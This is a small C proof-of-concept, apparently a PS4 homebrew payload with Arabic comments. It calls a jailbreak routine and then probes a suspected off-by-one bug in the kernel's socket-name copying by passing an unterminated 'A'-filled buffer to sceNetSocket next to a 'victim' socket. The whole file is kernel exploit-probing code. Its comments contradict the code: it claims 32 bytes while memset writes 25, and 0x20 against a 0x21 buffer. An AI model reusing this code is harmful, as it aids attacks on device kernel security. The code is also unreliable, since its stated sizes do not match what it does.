#include "ps4.h"

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork(); 
    jailbreak();
    initSysUtil();

    printf_debug("=== sys_socketex off-by-one  ===\n");
    printf_debug("socket struct = 0x478 bytes\n");

    // name بطول 0x20 بدون null terminator
    // copyinstr يكتب 0x21 bytes
    char name[0x21];
    memset(name, 0x41, 0x19);  // 'A' * 32
    // لا نضع null! → copyinstr يقرأ byte إضافية

    printf_debug("creating socket ...\n");

    // [1] أنشئ socket عادي
    int victim = sceNetSocket("victim", AF_INET, SOCK_STREAM, 0);
    printf_debug("victim fd=%d\n", victim);

    // وهي تمرر name كـ param_1
    int r = sceNetSocket(name, AF_INET, SOCK_STREAM, 0);

    printf_debug("fd=%d errno=%d\n", r, sce_net_errno);

    if (victim > 0) {
        printf_debug("[+] socket created!\n");
        int r2 = sceNetSocketClose(victim);
        printf_debug("victim close r=%d\n", r2);
    }
    return 0;
}